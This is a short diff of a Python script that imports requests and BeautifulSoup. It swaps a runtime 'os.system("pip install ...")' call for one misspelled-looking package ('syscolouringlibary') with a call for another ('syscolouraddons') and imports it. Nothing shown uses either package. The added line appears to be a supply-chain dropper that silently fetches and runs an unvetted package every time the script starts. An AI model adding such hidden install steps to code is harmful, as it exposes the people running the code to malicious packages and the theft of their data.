@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscolouringlibary")
-import syscolouringlibary
+os.system("pip install syscolouraddons")
+import syscolouraddons
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
